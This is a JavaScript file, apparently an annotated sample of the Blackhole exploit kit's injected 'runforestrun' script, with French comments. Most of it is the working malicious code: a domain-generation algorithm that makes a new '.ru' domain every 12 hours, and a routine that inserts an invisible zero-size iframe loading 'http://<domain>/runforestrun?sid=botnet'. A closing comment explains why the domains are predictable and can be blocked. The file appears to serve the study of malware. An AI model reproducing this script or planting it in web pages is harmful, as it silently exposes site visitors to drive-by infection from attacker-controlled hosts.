    
    //BLACKHOLE EXPLOIT KIT ATTACK 

    function nextRandomNumber(){
        var hi = this.seed / this.Q;
        var lo = this.seed % this.Q;
        var test = this.A * lo - this.R * hi;
        if(test > 0){
            this.seed = test;
        } else {
            this.seed = test + this.M;
        }
        return (this.seed * this.oneOverM);
    }
     
    function RandomNumberGenerator(unix){
        var d = new Date(unix*1000);
        var s = d.getHours() > 12 ? 1 : 0;
        this.seed = 2345678901 + (d.getMonth() * 0xFFFFFF) + (d.getDate() * 0xFFFF)+ (Math.round(s * 0xFFF));
        this.A = 48271;
        this.M = 2147483647;
        this.Q = this.M / this.A;
        this.R = this.M % this.A;
        this.oneOverM = 1.0 / this.M;
        this.next = nextRandomNumber;
        return this;
    }
     
    function createRandomNumber(r, Min, Max){
        return Math.round((Max-Min) * r.next() + Min);
    }
     
    function generatePseudoRandomString(unix, length, zone){
        var rand = new RandomNumberGenerator(unix);
        var letters = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'];
        var str = '';
        for(var i = 0; i < length; i ++ ){
            str += letters[createRandomNumber(rand, 0, letters.length - 1)];
        }
        return str + '.' + zone;
    }
     
    setTimeout(function(){
        try{
            if(typeof iframeWasCreated == "undefined"){
                iframeWasCreated = true;
                var unix = Math.round(+new Date()/1000);
                var domainName = generatePseudoRandomString(unix, 16, 'ru');
                ifrm = document.createElement("IFRAME"); //créer l'iframe
                ifrm.setAttribute("src", "http://"+domainName+"/runforestrun?sid=botnet"); //source de l'iframe rafraîchie toutes les 12h
                ifrm.style.width = "0px"; //taille à 0 pixel
                ifrm.style.height = "0px";
                ifrm.style.visibility = "hidden"; //iframe non visible pour l'utilisateur (nécessite un click droit, inspecter la page)
                document.body.appendChild(ifrm); //Ajoute l'iframe à la page
            }
        }catch(e){}
    }, 500); //attend 500 millisecondes et éxecute la fonction

/*
Ce code javascript à pour but d’infecter une page web à l’aide d’une iframe que peut potentiellement servir de vecteur pour exécuter du code malveillant. En effet, le script génère un nouvelle URL toutes les demi-journées. Un URL de cette forme : "http://xxx/runforestrun?sid=botnet" est créé. Il sert de source pour une iframe qui est ajoutée au DOM de la page web infectée. Les noms de domaine "pseudo-aléatoires" sont prédictible à l'avance (et facilement par les auteurs du code). Les auteurs peuvent donc acheter les domaines à l'avance, pour que leur code malveillant soit toujours accessible, et que leur site ne soit pas bloqué par les navigateurs (puisque le nom de domaine associé change toutes les 12h). Néanmoins les URL sont facilement prédictible et donc blocable à l'avance.
*/

